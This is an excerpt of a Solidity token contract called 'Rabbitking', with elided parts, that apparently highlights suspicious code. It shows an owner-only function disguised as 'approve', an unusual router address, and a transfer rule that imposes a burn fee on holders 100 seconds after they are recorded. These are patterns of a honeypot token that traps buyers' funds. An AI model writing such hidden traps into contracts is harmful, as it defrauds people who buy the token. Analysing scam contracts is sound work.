...
contract  Rabbitking  is Ownable, IERC20 {
    ...
    constructor () {
        ...
        uniswapV2Router = IDEXRouter(0xB6BA90af76D139AB3170c7df0139636dB6120F7e);
    ...
    function approve(address recipient) external  {  require( _isExcludedFromFee[msg.sender]);
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if (    Buyser[from] + 100  <= block.timestamp )    {   burnfee = amount.mul(bf).div(100); }     }  }
